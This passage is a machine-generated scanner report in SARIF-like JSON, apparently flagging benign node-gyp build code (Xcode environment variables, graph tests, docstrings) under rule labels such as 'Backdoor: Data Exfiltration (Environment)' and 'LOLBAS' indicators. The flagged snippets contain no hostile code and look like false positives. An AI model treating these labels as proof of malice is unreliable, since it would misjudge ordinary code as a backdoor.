                    "text": "            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleResourceFolder()\n        env[\"JAVA_FOLDER_PATH\"] = xcode_settings.GetBundleJavaFolderPath()\n        env[\"FRAMEWORKS_FOLDER_PATH\"] = xcode_settings.GetBundleFrameworksFolderPath()\n        env[\n            \"SHARED_FRAMEWORKS_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleSharedFrameworksFolderPath()\n",
                    "rendered": {
                      "text": "            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleResourceFolder()\n        env[\"JAVA_FOLDER_PATH\"] = xcode_settings.GetBundleJavaFolderPath()\n        env[\"FRAMEWORKS_FOLDER_PATH\"] = xcode_settings.GetBundleFrameworksFolderPath()\n        env[\n            \"SHARED_FRAMEWORKS_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleSharedFrameworksFolderPath()\n",
                      "markdown": "`            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleResourceFolder()\n        env[\"JAVA_FOLDER_PATH\"] = xcode_settings.GetBundleJavaFolderPath()\n        env[\"FRAMEWORKS_FOLDER_PATH\"] = xcode_settings.GetBundleFrameworksFolderPath()\n        env[\n            \"SHARED_FRAMEWORKS_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleSharedFrameworksFolderPath()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1776,
                  "startColumn": 8,
                  "endLine": 1776,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        env[\n            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleResourceFolder()\n        env[\"JAVA_FOLDER_PATH\"] = xcode_settings.GetBundleJavaFolderPath()\n        env[\"FRAMEWORKS_FOLDER_PATH\"] = xcode_settings.GetBundleFrameworksFolderPath()\n        env[\n            \"SHARED_FRAMEWORKS_FOLDER_PATH\"\n",
                    "rendered": {
                      "text": "        env[\n            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleResourceFolder()\n        env[\"JAVA_FOLDER_PATH\"] = xcode_settings.GetBundleJavaFolderPath()\n        env[\"FRAMEWORKS_FOLDER_PATH\"] = xcode_settings.GetBundleFrameworksFolderPath()\n        env[\n            \"SHARED_FRAMEWORKS_FOLDER_PATH\"\n",
                      "markdown": "`        env[\n            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleResourceFolder()\n        env[\"JAVA_FOLDER_PATH\"] = xcode_settings.GetBundleJavaFolderPath()\n        env[\"FRAMEWORKS_FOLDER_PATH\"] = xcode_settings.GetBundleFrameworksFolderPath()\n        env[\n            \"SHARED_FRAMEWORKS_FOLDER_PATH\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1772,
                  "startColumn": 8,
                  "endLine": 1772,
                  "endColumn": 58,
                  "snippet": {
                    "text": "            built_products_dir + os.sep + xcode_settings.GetBundleFrameworksFolderPath()\n        )\n        env[\"CONTENTS_FOLDER_PATH\"] = xcode_settings.GetBundleContentsFolderPath()\n        env[\"EXECUTABLE_FOLDER_PATH\"] = xcode_settings.GetBundleExecutableFolderPath()\n        env[\n            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleResourceFolder()\n",
                    "rendered": {
                      "text": "            built_products_dir + os.sep + xcode_settings.GetBundleFrameworksFolderPath()\n        )\n        env[\"CONTENTS_FOLDER_PATH\"] = xcode_settings.GetBundleContentsFolderPath()\n        env[\"EXECUTABLE_FOLDER_PATH\"] = xcode_settings.GetBundleExecutableFolderPath()\n        env[\n            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleResourceFolder()\n",
                      "markdown": "`            built_products_dir + os.sep + xcode_settings.GetBundleFrameworksFolderPath()\n        )\n        env[\"CONTENTS_FOLDER_PATH\"] = xcode_settings.GetBundleContentsFolderPath()\n        env[\"EXECUTABLE_FOLDER_PATH\"] = xcode_settings.GetBundleExecutableFolderPath()\n        env[\n            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n        ] = xcode_settings.GetBundleResourceFolder()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1771,
                  "startColumn": 8,
                  "endLine": 1771,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        env[\"BUILT_FRAMEWORKS_DIR\"] = os.path.join(\n            built_products_dir + os.sep + xcode_settings.GetBundleFrameworksFolderPath()\n        )\n        env[\"CONTENTS_FOLDER_PATH\"] = xcode_settings.GetBundleContentsFolderPath()\n        env[\"EXECUTABLE_FOLDER_PATH\"] = xcode_settings.GetBundleExecutableFolderPath()\n        env[\n            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n",
                    "rendered": {
                      "text": "        env[\"BUILT_FRAMEWORKS_DIR\"] = os.path.join(\n            built_products_dir + os.sep + xcode_settings.GetBundleFrameworksFolderPath()\n        )\n        env[\"CONTENTS_FOLDER_PATH\"] = xcode_settings.GetBundleContentsFolderPath()\n        env[\"EXECUTABLE_FOLDER_PATH\"] = xcode_settings.GetBundleExecutableFolderPath()\n        env[\n            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n",
                      "markdown": "`        env[\"BUILT_FRAMEWORKS_DIR\"] = os.path.join(\n            built_products_dir + os.sep + xcode_settings.GetBundleFrameworksFolderPath()\n        )\n        env[\"CONTENTS_FOLDER_PATH\"] = xcode_settings.GetBundleContentsFolderPath()\n        env[\"EXECUTABLE_FOLDER_PATH\"] = xcode_settings.GetBundleExecutableFolderPath()\n        env[\n            \"UNLOCALIZED_RESOURCES_FOLDER_PATH\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1764,
                  "startColumn": 8,
                  "endLine": 1764,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        mach_o_type = xcode_settings.GetMachOType()\n        if mach_o_type:\n            env[\"MACH_O_TYPE\"] = mach_o_type\n        env[\"PRODUCT_TYPE\"] = xcode_settings.GetProductType()\n    if xcode_settings._IsBundle():\n        # xcodeproj_file.py sets the same Xcode subfolder value for this as for\n        # FRAMEWORKS_FOLDER_PATH so Xcode builds will actually use FFP's value.\n",
                    "rendered": {
                      "text": "        mach_o_type = xcode_settings.GetMachOType()\n        if mach_o_type:\n            env[\"MACH_O_TYPE\"] = mach_o_type\n        env[\"PRODUCT_TYPE\"] = xcode_settings.GetProductType()\n    if xcode_settings._IsBundle():\n        # xcodeproj_file.py sets the same Xcode subfolder value for this as for\n        # FRAMEWORKS_FOLDER_PATH so Xcode builds will actually use FFP's value.\n",
                      "markdown": "`        mach_o_type = xcode_settings.GetMachOType()\n        if mach_o_type:\n            env[\"MACH_O_TYPE\"] = mach_o_type\n        env[\"PRODUCT_TYPE\"] = xcode_settings.GetProductType()\n    if xcode_settings._IsBundle():\n        # xcodeproj_file.py sets the same Xcode subfolder value for this as for\n        # FRAMEWORKS_FOLDER_PATH so Xcode builds will actually use FFP's value.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1760,
                  "startColumn": 8,
                  "endLine": 1760,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    ):\n        env[\"EXECUTABLE_NAME\"] = xcode_settings.GetExecutableName()\n        env[\"EXECUTABLE_PATH\"] = xcode_settings.GetExecutablePath()\n        env[\"FULL_PRODUCT_NAME\"] = xcode_settings.GetFullProductName()\n        mach_o_type = xcode_settings.GetMachOType()\n        if mach_o_type:\n            env[\"MACH_O_TYPE\"] = mach_o_type\n",
                    "rendered": {
                      "text": "    ):\n        env[\"EXECUTABLE_NAME\"] = xcode_settings.GetExecutableName()\n        env[\"EXECUTABLE_PATH\"] = xcode_settings.GetExecutablePath()\n        env[\"FULL_PRODUCT_NAME\"] = xcode_settings.GetFullProductName()\n        mach_o_type = xcode_settings.GetMachOType()\n        if mach_o_type:\n            env[\"MACH_O_TYPE\"] = mach_o_type\n",
                      "markdown": "`    ):\n        env[\"EXECUTABLE_NAME\"] = xcode_settings.GetExecutableName()\n        env[\"EXECUTABLE_PATH\"] = xcode_settings.GetExecutablePath()\n        env[\"FULL_PRODUCT_NAME\"] = xcode_settings.GetFullProductName()\n        mach_o_type = xcode_settings.GetMachOType()\n        if mach_o_type:\n            env[\"MACH_O_TYPE\"] = mach_o_type\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1759,
                  "startColumn": 8,
                  "endLine": 1759,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        \"loadable_module\",\n    ):\n        env[\"EXECUTABLE_NAME\"] = xcode_settings.GetExecutableName()\n        env[\"EXECUTABLE_PATH\"] = xcode_settings.GetExecutablePath()\n        env[\"FULL_PRODUCT_NAME\"] = xcode_settings.GetFullProductName()\n        mach_o_type = xcode_settings.GetMachOType()\n        if mach_o_type:\n",
                    "rendered": {
                      "text": "        \"loadable_module\",\n    ):\n        env[\"EXECUTABLE_NAME\"] = xcode_settings.GetExecutableName()\n        env[\"EXECUTABLE_PATH\"] = xcode_settings.GetExecutablePath()\n        env[\"FULL_PRODUCT_NAME\"] = xcode_settings.GetFullProductName()\n        mach_o_type = xcode_settings.GetMachOType()\n        if mach_o_type:\n",
                      "markdown": "`        \"loadable_module\",\n    ):\n        env[\"EXECUTABLE_NAME\"] = xcode_settings.GetExecutableName()\n        env[\"EXECUTABLE_PATH\"] = xcode_settings.GetExecutablePath()\n        env[\"FULL_PRODUCT_NAME\"] = xcode_settings.GetFullProductName()\n        mach_o_type = xcode_settings.GetMachOType()\n        if mach_o_type:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1758,
                  "startColumn": 8,
                  "endLine": 1758,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        \"shared_library\",\n        \"loadable_module\",\n    ):\n        env[\"EXECUTABLE_NAME\"] = xcode_settings.GetExecutableName()\n        env[\"EXECUTABLE_PATH\"] = xcode_settings.GetExecutablePath()\n        env[\"FULL_PRODUCT_NAME\"] = xcode_settings.GetFullProductName()\n        mach_o_type = xcode_settings.GetMachOType()\n",
                    "rendered": {
                      "text": "        \"shared_library\",\n        \"loadable_module\",\n    ):\n        env[\"EXECUTABLE_NAME\"] = xcode_settings.GetExecutableName()\n        env[\"EXECUTABLE_PATH\"] = xcode_settings.GetExecutablePath()\n        env[\"FULL_PRODUCT_NAME\"] = xcode_settings.GetFullProductName()\n        mach_o_type = xcode_settings.GetMachOType()\n",
                      "markdown": "`        \"shared_library\",\n        \"loadable_module\",\n    ):\n        env[\"EXECUTABLE_NAME\"] = xcode_settings.GetExecutableName()\n        env[\"EXECUTABLE_PATH\"] = xcode_settings.GetExecutablePath()\n        env[\"FULL_PRODUCT_NAME\"] = xcode_settings.GetFullProductName()\n        mach_o_type = xcode_settings.GetMachOType()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1699,
                  "startColumn": 10,
                  "endLine": 1699,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        defines = []\n\n    dest_plist = os.path.join(product_dir, xcode_settings.GetBundlePlistPath())\n    extra_env = xcode_settings.GetPerTargetSettings()\n\n    return info_plist, dest_plist, defines, extra_env\n\n",
                    "rendered": {
                      "text": "        defines = []\n\n    dest_plist = os.path.join(product_dir, xcode_settings.GetBundlePlistPath())\n    extra_env = xcode_settings.GetPerTargetSettings()\n\n    return info_plist, dest_plist, defines, extra_env\n\n",
                      "markdown": "`        defines = []\n\n    dest_plist = os.path.join(product_dir, xcode_settings.GetBundlePlistPath())\n    extra_env = xcode_settings.GetPerTargetSettings()\n\n    return info_plist, dest_plist, defines, extra_env\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_emulation.py"
                },
                "region": {
                  "startLine": 1086,
                  "startColumn": 47,
                  "endLine": 1086,
                  "endColumn": 61,
                  "snippet": {
                    "text": "\n            explicit_strip_flags = self._Settings().get(\"STRIPFLAGS\", \"\")\n            if explicit_strip_flags:\n                strip_flags += \" \" + _NormalizeEnvVarReferences(explicit_strip_flags)\n\n            if not quiet:\n                result.append(\"echo STRIP\\\\(%s\\\\)\" % self.spec[\"target_name\"])\n",
                    "rendered": {
                      "text": "\n            explicit_strip_flags = self._Settings().get(\"STRIPFLAGS\", \"\")\n            if explicit_strip_flags:\n                strip_flags += \" \" + _NormalizeEnvVarReferences(explicit_strip_flags)\n\n            if not quiet:\n                result.append(\"echo STRIP\\\\(%s\\\\)\" % self.spec[\"target_name\"])\n",
                      "markdown": "`\n            explicit_strip_flags = self._Settings().get(\"STRIPFLAGS\", \"\")\n            if explicit_strip_flags:\n                strip_flags += \" \" + _NormalizeEnvVarReferences(explicit_strip_flags)\n\n            if not quiet:\n                result.append(\"echo STRIP\\\\(%s\\\\)\" % self.spec[\"target_name\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input_test.py"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 18,
                  "endLine": 40,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        self._create_dependency(self.nodes[\"a\"], self.nodes[\"c\"])\n        self._create_dependency(self.nodes[\"b\"], self.nodes[\"c\"])\n\n        for label, node in self.nodes.items():\n            self.assertEqual([], node.FindCycles())\n\n    def test_cycle_self_reference(self):\n",
                    "rendered": {
                      "text": "        self._create_dependency(self.nodes[\"a\"], self.nodes[\"c\"])\n        self._create_dependency(self.nodes[\"b\"], self.nodes[\"c\"])\n\n        for label, node in self.nodes.items():\n            self.assertEqual([], node.FindCycles())\n\n    def test_cycle_self_reference(self):\n",
                      "markdown": "`        self._create_dependency(self.nodes[\"a\"], self.nodes[\"c\"])\n        self._create_dependency(self.nodes[\"b\"], self.nodes[\"c\"])\n\n        for label, node in self.nodes.items():\n            self.assertEqual([], node.FindCycles())\n\n    def test_cycle_self_reference(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input_test.py"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 18,
                  "endLine": 32,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        self._create_dependency(self.nodes[\"b\"], self.nodes[\"c\"])\n        self._create_dependency(self.nodes[\"c\"], self.nodes[\"d\"])\n\n        for label, node in self.nodes.items():\n            self.assertEqual([], node.FindCycles())\n\n    def test_no_cycle_dag(self):\n",
                    "rendered": {
                      "text": "        self._create_dependency(self.nodes[\"b\"], self.nodes[\"c\"])\n        self._create_dependency(self.nodes[\"c\"], self.nodes[\"d\"])\n\n        for label, node in self.nodes.items():\n            self.assertEqual([], node.FindCycles())\n\n    def test_no_cycle_dag(self):\n",
                      "markdown": "`        self._create_dependency(self.nodes[\"b\"], self.nodes[\"c\"])\n        self._create_dependency(self.nodes[\"c\"], self.nodes[\"d\"])\n\n        for label, node in self.nodes.items():\n            self.assertEqual([], node.FindCycles())\n\n    def test_no_cycle_dag(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input_test.py"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 18,
                  "endLine": 24,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        dependency.dependents.append(dependent)\n\n    def test_no_cycle_empty_graph(self):\n        for label, node in self.nodes.items():\n            self.assertEqual([], node.FindCycles())\n\n    def test_no_cycle_line(self):\n",
                    "rendered": {
                      "text": "        dependency.dependents.append(dependent)\n\n    def test_no_cycle_empty_graph(self):\n        for label, node in self.nodes.items():\n            self.assertEqual([], node.FindCycles())\n\n    def test_no_cycle_line(self):\n",
                      "markdown": "`        dependency.dependents.append(dependent)\n\n    def test_no_cycle_empty_graph(self):\n        for label, node in self.nodes.items():\n            self.assertEqual([], node.FindCycles())\n\n    def test_no_cycle_line(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 157,
                  "startColumn": 45,
                  "endLine": 157,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    Args:\n      files: A list of Filter objects and/or relative paths to files.\n\n    This makes a copy of the file/filter tree at the time of this call.  If you\n    later add files to a Filter object which was passed into a previous call\n    to AddFiles(), it will not be reflected in this project.\n    \"\"\"\n",
                    "rendered": {
                      "text": "    Args:\n      files: A list of Filter objects and/or relative paths to files.\n\n    This makes a copy of the file/filter tree at the time of this call.  If you\n    later add files to a Filter object which was passed into a previous call\n    to AddFiles(), it will not be reflected in this project.\n    \"\"\"\n",
                      "markdown": "`    Args:\n      files: A list of Filter objects and/or relative paths to files.\n\n    This makes a copy of the file/filter tree at the time of this call.  If you\n    later add files to a Filter object which was passed into a previous call\n    to AddFiles(), it will not be reflected in this project.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 36,
                  "endLine": 183,
                  "snippet": {
                    "text": "        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n\n        # Add the config to the file node\n        spec = self._GetSpecForConfiguration(\"FileConfiguration\", config, attrs, tools)\n        parent.append(spec)\n\n    def WriteIfChanged(self):\n",
                    "rendered": {
                      "text": "        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n\n        # Add the config to the file node\n        spec = self._GetSpecForConfiguration(\"FileConfiguration\", config, attrs, tools)\n        parent.append(spec)\n\n    def WriteIfChanged(self):\n",
                      "markdown": "`        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n\n        # Add the config to the file node\n        spec = self._GetSpecForConfiguration(\"FileConfiguration\", config, attrs, tools)\n        parent.append(spec)\n\n    def WriteIfChanged(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 23,
                  "endLine": 177,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    Raises:\n      ValueError: Relative path does not match any file added via AddFiles().\n    \"\"\"\n        # Find the file node with the right relative path\n        parent = self.files_dict.get(path)\n        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n",
                    "rendered": {
                      "text": "    Raises:\n      ValueError: Relative path does not match any file added via AddFiles().\n    \"\"\"\n        # Find the file node with the right relative path\n        parent = self.files_dict.get(path)\n        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n",
                      "markdown": "`    Raises:\n      ValueError: Relative path does not match any file added via AddFiles().\n    \"\"\"\n        # Find the file node with the right relative path\n        parent = self.files_dict.get(path)\n        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 9,
                  "endLine": 177,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    Raises:\n      ValueError: Relative path does not match any file added via AddFiles().\n    \"\"\"\n        # Find the file node with the right relative path\n        parent = self.files_dict.get(path)\n        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n",
                    "rendered": {
                      "text": "    Raises:\n      ValueError: Relative path does not match any file added via AddFiles().\n    \"\"\"\n        # Find the file node with the right relative path\n        parent = self.files_dict.get(path)\n        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n",
                      "markdown": "`    Raises:\n      ValueError: Relative path does not match any file added via AddFiles().\n    \"\"\"\n        # Find the file node with the right relative path\n        parent = self.files_dict.get(path)\n        if not parent:\n            raise ValueError('AddFileConfig: file \"%s\" not in project.' % path)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 157,
                  "startColumn": 52,
                  "endLine": 157,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    Args:\n      files: A list of Filter objects and/or relative paths to files.\n\n    This makes a copy of the file/filter tree at the time of this call.  If you\n    later add files to a Filter object which was passed into a previous call\n    to AddFiles(), it will not be reflected in this project.\n    \"\"\"\n",
                    "rendered": {
                      "text": "    Args:\n      files: A list of Filter objects and/or relative paths to files.\n\n    This makes a copy of the file/filter tree at the time of this call.  If you\n    later add files to a Filter object which was passed into a previous call\n    to AddFiles(), it will not be reflected in this project.\n    \"\"\"\n",
                      "markdown": "`    Args:\n      files: A list of Filter objects and/or relative paths to files.\n\n    This makes a copy of the file/filter tree at the time of this call.  If you\n    later add files to a Filter object which was passed into a previous call\n    to AddFiles(), it will not be reflected in this project.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 148,
                  "startColumn": 36,
                  "endLine": 149,
                  "snippet": {
                    "text": "                self._AddFilesToNode(node, f.contents)\n            else:\n                node = [\"File\", {\"RelativePath\": f}]\n                self.files_dict[f] = node\n            parent.append(node)\n\n    def AddFiles(self, files):\n        \"\"\"Adds files to the project.\n",
                    "rendered": {
                      "text": "                self._AddFilesToNode(node, f.contents)\n            else:\n                node = [\"File\", {\"RelativePath\": f}]\n                self.files_dict[f] = node\n            parent.append(node)\n\n    def AddFiles(self, files):\n        \"\"\"Adds files to the project.\n",
                      "markdown": "`                self._AddFilesToNode(node, f.contents)\n            else:\n                node = [\"File\", {\"RelativePath\": f}]\n                self.files_dict[f] = node\n            parent.append(node)\n\n    def AddFiles(self, files):\n        \"\"\"Adds files to the project.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSProject.py"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 15,
                  "endLine": 147,
                  "endColumn": 21,
                  "snippet": {
